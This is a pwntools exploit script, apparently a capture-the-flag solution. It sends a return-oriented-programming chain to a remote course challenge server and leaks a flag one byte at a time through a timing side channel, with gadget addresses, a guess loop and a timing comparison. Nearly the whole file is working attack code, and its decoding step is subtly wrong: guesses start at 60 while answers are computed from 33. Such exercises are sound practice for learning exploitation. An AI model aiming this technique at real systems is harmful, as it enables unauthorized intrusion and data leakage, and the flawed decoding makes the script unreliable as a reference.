from pwn import *
from datetime import datetime
import time

time_scale = 1

pop_rdi_ret = 0x401812
pop_rsi_ret = 0x402798
pop_rdx_ret = 0x40171f
pop_rbx_ret = 0x401fa2
pop_rax_ret = 0x458237
test_rdi_minus_76b60005_bl_ret = 0x473e98 #rdx
xor_rbx_minus_0x78f0fd07_al_ret = 0x413733
cmp_rax_dl_ret = 0x438c36
jne_0x426148_ret = 0x426159
jne_0x4541c0_ret = 0x4541d1 
jne_0x47f7a0_ret = 0x47f7ad # available !!!

flag = 0x4de2e0
syscall = 0x457675
text_start = 0x4011a0
read_offset = 0x4a4ce0 # .rodata

small_esi = 2**31 + 1

memset = 0x431470
malloc = 0x42de20
size = 0x1000

mov_ptr_rdx_rax_ret = 0x427e48
mov_rax_ptr_rax_plus_8_ret = 0x48d114

context.arch = 'amd64'

def gen_rop(guess):
    # guess is ascii
    loop = flat(
        pop_rax_ret, flag,
        pop_rdx_ret, guess, # guess byte
        cmp_rax_dl_ret, # test if guessed right
        pop_rax_ret, read_offset - 4, # iterator
        pop_rsi_ret, small_esi, # extremely small esi
        # prepare some register values
        jne_0x47f7a0_ret # create a loop
    )
    
    rop = flat(
        0, 0, 0, 0,
        0, # old rsp
        pop_rdi_ret, size,
        malloc
    )
    # print(rop)
    rop += loop * 50
    rop += flat(
        pop_rdi_ret, 0,
        pop_rax_ret, 0x3c,
        syscall
    )
    return rop

def try_guess(guess, time_arr):
    r = remote('edu-ctf.zoolab.org', 10012)
    # r = process('./chal')
    rop = gen_rop(guess)
    start_time = datetime.now().timestamp()
    r.sendlineafter(b'rop\n', rop)
    end_time = datetime.now().timestamp()
    time_diff = end_time - start_time
    time_arr.append(time_diff)
    print(r.recvall())
    r.close()
    print('Guess:', chr(guess))
    print('Time spent:', time_diff)
    print('------------------------------------')

    time.sleep(1)
if __name__ == "__main__":
    # guess = 'G'
    # print('guess:', guess)
    # print('rop:', gen_rop(ord(guess)))
    # gdb.attach(r)
    
    
    
    answer = ''
    for _ in range(48):
        time_arr = []
        guess = 60
        err = 0
        while guess < 127:
            try_guess(guess, time_arr)
            guess += 1
            time.sleep(0.001)
            # try:
            #     if 2 < err < 4:
            #         time.sleep(1*time_scale)
            #     elif 4< err < 4:
            #         time.sleep(3*time_scale)

            #     try_guess(guess, time_arr)
            #     guess += 1
            #     print('increment guess')
            #     err = 0
            # except EOFError:
            #     print('EOF')
            #     r = remote('edu-ctf.zoolab.org', 10012)
            #     err += 1
            #     time.sleep(1*time_scale)
            # except:
                # print('error!!!!!!!!')
                # err += 1
                # time.sleep(1*time_scale)
        
            
        min_t = 100
        ans = 0
        for i, t in enumerate(time_arr):
            if t < min_t:
                min_t = t
                ans = 33 + i
        answer += chr(ans)
        print('answer:', answer)
        flag += 1 # flag addr
    
    # r.interactive()
    